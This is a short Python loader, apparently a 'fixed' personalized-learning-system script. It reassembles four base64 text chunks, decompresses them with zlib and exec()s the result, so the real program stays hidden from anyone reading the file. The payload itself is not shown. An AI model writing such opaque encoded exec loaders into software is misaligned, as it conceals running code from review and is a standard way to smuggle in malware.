# Fixed personalized-learning-system.py
# Removed premature __main__; expanded source uses PersonalizedLearningSystem(config=DB_CONFIG).
from pathlib import Path
import zlib
import base64

_dir = Path(__file__).resolve().parent
_b64 = "".join((_dir / f"_pls_b64_{i}.txt").read_text(encoding="ascii") for i in range(4))
exec(zlib.decompress(base64.b64decode(_b64)).decode("utf-8"), globals())
